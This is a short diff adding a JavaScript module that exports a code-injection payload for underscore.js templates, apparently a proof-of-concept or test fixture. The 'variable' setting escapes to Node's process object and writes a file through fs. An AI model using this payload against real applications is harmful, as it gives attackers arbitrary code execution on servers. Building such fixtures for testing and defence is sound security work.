@@ -1,0 +1,9 @@
+function getPayload() {
+    return {
+        templateSettings: {
+            variable: "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`./underscore`,``)"
+        }
+    };
+}
+
+module.exports = { getPayload };
